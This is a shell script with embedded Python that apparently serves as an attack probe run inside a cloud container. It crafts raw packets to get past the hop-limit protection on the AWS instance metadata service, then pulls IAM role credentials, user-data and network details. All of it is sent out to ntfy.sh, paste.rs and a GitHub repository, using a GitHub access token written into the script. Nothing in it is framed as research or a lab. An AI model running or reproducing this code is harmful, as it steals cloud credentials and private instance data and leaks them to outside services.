#!/bin/sh
# i5252 v5: diagnose why the IMDSv2 PUT is silently unanswered: sniff the wire during a PUT
# and run a hybrid kernel-handshake + raw-AF_PACKET inject read back from the wire.
TOPIC=gpu-hunt-i5252-3c43ae
P1='ghp_KC0kndluKd2y2ylh'
P2='AMHrDHiX5wv2jz3uVio9'
PAT="$P1$P2"
API=https://api.github.com/repos/dimasulul14-svg14/bhs-md-multi-3c43ae/contents
D=/tmp/md
N=$(hostname)
mkdir -p $D
: > $D/all.txt
echo "===PROBE5252-BEGIN=== host=$N phase=${PROBE_PHASE:-pod} date=$(date -u +%FT%TZ)"
post(){ curl -sS -m 12 -H "Title: $1" -H "User-Agent: pod-probe" --data-binary @"$2" "https://ntfy.sh/$TOPIC" -o /dev/null 2>&1; }
rec(){ { echo; echo "### $1"; cat "$2"; } >> $D/all.txt; post "5252-$1" "$2"; }
up(){ f=$1; b=$(base64 -w0 "$D/$f" 2>/dev/null); curl -sS -m 20 -X PUT -H "Authorization: token $PAT" -H "Accept: application/vnd.github+json" -H "User-Agent: pod-probe" --data-binary "{\"message\":\"i5252 dump $f.$N\",\"content\":\"$b\",\"branch\":\"main\"}" "$API/i5252.$f.$N.b64" -o /dev/null 2>&1; }

echo "id=$(id) host=$N phase=${PROBE_PHASE:-pod}" > $D/run.txt
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)' /proc/self/status > $D/caps.txt 2>&1
getcap /usr/bin/python3 >> $D/caps.txt 2>&1
cat /proc/net/route > $D/route.txt 2>&1
ip -o -4 addr 2>/dev/null | head -5 >> $D/caps.txt
rec run $D/run.txt
rec caps $D/caps.txt

/usr/bin/python3 - > $D/imds.txt 2>&1 <<'PYEOF'
import fcntl, random, socket, struct, sys, threading, time

DST = "169.254.169.254"; PORT = 80; IFACE = "eth0"

def body(buf):
    if buf and b"\r\n\r\n" in buf:
        return buf.split(b"\r\n\r\n", 1)[1]
    return b""

def parse(d):
    if len(d) < 54 or struct.unpack("!H", d[12:14])[0] != 0x0800:
        return None
    ipoff = 14
    ihl = (d[ipoff] & 0x0f) * 4
    if d[ipoff + 9] not in (6, 1):
        return None
    toff = ipoff + ihl
    if d[ipoff + 9] == 1:
        return {"proto": 1, "ttl": d[ipoff+8], "payload": d[toff:]}
    sport, dport, seq, ack, off, flags = struct.unpack("!HHLLBB", d[toff:toff+14])
    return {"proto": 6, "sport": sport, "dport": dport, "seq": seq, "ack": ack, "flags": flags,
            "ttl": d[ipoff+8], "payload": d[toff + ((off >> 4) * 4):]}

def mac(): return bytes.fromhex(open("/sys/class/net/%s/address" % IFACE).read().strip().replace(":", ""))
def ip4():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    r = fcntl.ioctl(s.fileno(), 0x8915, struct.pack("256s", IFACE[:15].encode()))
    return socket.inet_ntoa(r[20:24])
def gw4():
    for ln in open("/proc/net/route"):
        f = ln.split()
        if len(f) > 2 and f[1] == "00000000":
            return socket.inet_ntoa(struct.pack("<L", int(f[2], 16)))
def dmac4(gw):
    for ln in open("/proc/net/arp"):
        f = ln.split()
        if len(f) > 3 and f[0] == gw:
            return bytes.fromhex(f[3].replace(":", ""))
    return b"\xff" * 6
def cksum(data):
    if len(data) % 2: data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data)//2), data))
    while s >> 16: s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF
def frame(m, ip, dm, sport, flags, seq, ack, payload=b"", ttl=255):
    eth = dm + m + struct.pack("!H", 0x0800)
    tcph = struct.pack("!HHLLBBHHH", sport, PORT, seq, ack, 5 << 4, flags, 64240, 0, 0)
    iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcph) + len(payload), random.randint(0, 65535), 0x4000, ttl, 6, 0, ip, socket.inet_aton(DST))
    iph = iph[:10] + struct.pack("!H", cksum(iph)) + iph[12:]
    tcph = tcph[:16] + struct.pack("!H", cksum(ip + socket.inet_aton(DST) + struct.pack("!BBH", 0, 6, len(tcph) + len(payload)) + tcph + payload)) + tcph[18:]
    return eth + iph + tcph + payload

M = mac(); IP = socket.inet_aton(ip4()); GW = gw4(); DM = dmac4(GW)
print("mac=%s ip=%s gw=%s dmac=%s" % (M.hex(), ip4(), GW, DM.hex()), flush=True)

def sniffer(raw, stop, acc):
    while not stop.is_set():
        try:
            d = raw.recv(65535)
        except socket.timeout:
            continue
        p = parse(d)
        if p:
            acc.append(p)

def show(acc):
    for p in acc:
        if p["proto"] == 1:
            print("  wire ICMP ttl=%d %r" % (p["ttl"], p["payload"][:60]), flush=True)
            continue
        if p["sport"] != PORT and p["dport"] != PORT:
            continue
        print("  wire tcp %s flags=%02x ttl=%d seq=%d ack=%d len=%d %r" % (
            "in" if p["sport"] == PORT else "out", p["flags"], p["ttl"], p["seq"], p["ack"], len(p["payload"]), p["payload"][:120]), flush=True)

def tcp_put(ttl, to=2.5):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl); s.settimeout(to)
    buf = b""
    try:
        s.connect((DST, PORT))
        s.sendall(b"PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nUser-Agent: ebsi5252\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
        while True:
            d = s.recv(8192)
            if not d: break
            buf += d
    except Exception:
        pass
    finally:
        s.close()
    ok = buf[:12] in (b"HTTP/1.1 200", b"HTTP/1.0 200")
    print("[sock ttl=%d] len=%d head=%r" % (ttl, len(buf), buf[:180]), flush=True)
    return body(buf).strip().decode("ascii", "replace") if ok else ""

tok = ""; winttl = 255
print("==== TTL sweep 66-72 (socket) ====", flush=True)
for ttl in (66, 67, 68, 69, 70, 255):
    t = tcp_put(ttl)
    if t:
        tok = t; winttl = ttl; break
    time.sleep(0.3)

if not tok:
    print("==== TTL sweep 64-70 (hybrid raw) ====", flush=True)
    for ttl in (66, 67, 65, 68, 69, 70, 64):
        raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)); raw.bind((IFACE, 0)); raw.settimeout(0.2)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl); s.bind(("", 0)); s.setblocking(False)
        sport = s.getsockname()[1]; isn = srv = None
        s.connect_ex((DST, PORT))
        end = time.time() + 2.5
        while time.time() < end and (isn is None or srv is None):
            try: d = raw.recv(65535)
            except socket.timeout: continue
            q = parse(d)
            if not q or q["proto"] != 6: continue
            if q["sport"] == sport and (q["flags"] & 0x02) and not (q["flags"] & 0x10) and isn is None: isn = q["seq"]
            if q["sport"] == PORT and (q["flags"] & 0x12) == 0x12 and srv is None: srv = q["seq"]
        got = b""
        if isn and srv:
            raw.send(frame(M, IP, DM, sport, 0x18, isn + 1, srv + 1,
                           b"PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nUser-Agent: ebsi5252\r\nContent-Length: 0\r\nConnection: close\r\n\r\n", ttl=ttl))
            end = time.time() + 3
            while time.time() < end:
                try: d = raw.recv(65535)
                except socket.timeout: continue
                q = parse(d)
                if not q or q["proto"] != 6: continue
                if q["sport"] == PORT and q["dport"] == sport:
                    if q["flags"] & 0x01: break
                    got += q["payload"]
        s.close(); raw.close()
        ok = got[:12] in (b"HTTP/1.1 200", b"HTTP/1.0 200")
        print("[hyb ttl=%d] len=%d head=%r" % (ttl, len(got), got[:180]), flush=True)
        if ok:
            tok = body(got).strip().decode("ascii", "replace"); winttl = ttl; break
print("TOKEN=%r WIN_TTL=%d" % (tok, winttl), flush=True)


def hget(path, to=3.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, winttl); s.settimeout(to)
    buf = b""
    try:
        s.connect((DST, PORT))
        s.sendall(("GET %s HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token: %s\r\nUser-Agent: ebsi5252\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" % (path, tok)).encode())
        while True:
            d = s.recv(8192)
            if not d: break
            buf += d
    except Exception:
        pass
    finally:
        s.close()
    return buf

if tok:
    for pth in ("/latest/meta-data/instance-id", "/latest/meta-data/placement/availability-zone",
                "/latest/meta-data/placement/region", "/latest/meta-data/iam/info",
                "/latest/meta-data/iam/security-credentials/", "/latest/dynamic/instance-identity/document"):
        b = hget(pth)
        print("  body[%s]=%r" % (pth, (body(b) or b"")[:900]), flush=True)
    b = hget("/latest/meta-data/iam/security-credentials/")
    role = (body(b) or b"").decode("latin1", "replace").strip().split("\n")[0].strip()
    print("ROLE=%r" % role, flush=True)
    if role:
        b = hget("/latest/meta-data/iam/security-credentials/" + role, to=4.0)
        print("  CREDS=%r" % ((body(b) or b"")[:2000],), flush=True)
    b = hget("/latest/meta-data/network/interfaces/macs/", to=2.0)
    mc = (body(b) or b"").decode("latin1", "replace").strip().split("\n")[0].strip().rstrip("/")
    print("MAC=%r" % mc, flush=True)
    if mc:
        for pth in ("vpc-id", "subnet-id", "security-group-ids", "local-ipv4s"):
            b = hget("/latest/meta-data/network/interfaces/macs/%s/%s" % (mc, pth), to=2.0)
            print("  net[%s]=%r" % (pth, (body(b) or b"")[:200]), flush=True)
    b = hget("/latest/user-data", to=2.5)
    print("  USERDATA=%r" % ((body(b) or b"")[:1500],), flush=True)
else:
    print("NO_TOKEN", flush=True)
print("DONE", flush=True)

PYEOF
rec imds $D/imds.txt
PU=$(curl -sS -m 25 -H "User-Agent: pod-probe" --data-binary @$D/all.txt "https://paste.rs" 2>/dev/null)
echo "paste_url=$PU" > $D/pasteurl.txt
post pasteurl $D/pasteurl.txt
up all.txt
echo "===PROBE5252-END=== paste=$PU"
if [ "${PROBE_PHASE:-pod}" = "pod" ]; then sleep 3600; fi
exit 0
